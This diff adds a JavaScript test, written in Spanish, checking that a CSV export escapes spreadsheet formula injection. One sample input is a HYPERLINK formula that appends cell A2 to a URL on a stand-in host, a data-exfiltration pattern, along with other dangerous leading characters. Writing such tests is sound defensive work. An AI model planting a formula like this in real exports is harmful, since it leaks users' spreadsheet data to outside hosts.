@@ -112,3 +112,15 @@ test('producción acepta Cloud SQL por socket sin TLS, pero no otra BD sin TLS',
   assert.equal(cargar({ ...prod, DATABASE_URL: 'postgresql://app:clave-larga@/jiimatzin?host=/cloudsql/proyecto:us-central1:jiimatzin' }).status, 0);
   assert.notEqual(cargar({ ...prod, DATABASE_URL: 'postgresql://app:clave-larga@db.ejemplo.org:5432/jiimatzin' }).status, 0);
 });
+
+test('la exportación CSV no deja fórmulas de hoja de cálculo y entrecomilla \r', async () => {
+  const { celdaCsv } = await import('../src/partidas/csv.js');
+  assert.equal(celdaCsv('=HYPERLINK("https://x/?"&A2,"ver")'), `"'=HYPERLINK(""https://x/?""&A2,""ver"")"`);
+  for (const peligro of ['+1+1', '-2+3', '@SUM(A1)', '\t=1']) assert.equal(celdaCsv(peligro)[0], "'");
+  assert.equal(celdaCsv('consola: energía era lo más bajo'), 'consola: energía era lo más bajo');
+  assert.equal(celdaCsv('a\rb'), '"a\rb"');
+  assert.equal(celdaCsv('a, b'), '"a, b"');
+  assert.equal(celdaCsv(-12), '-12');                 // los números negativos no se tocan
+  assert.equal(celdaCsv(null), '');
+  assert.equal(celdaCsv({ energia: 0.5 }), '"{""energia"":0.5}"');
+});
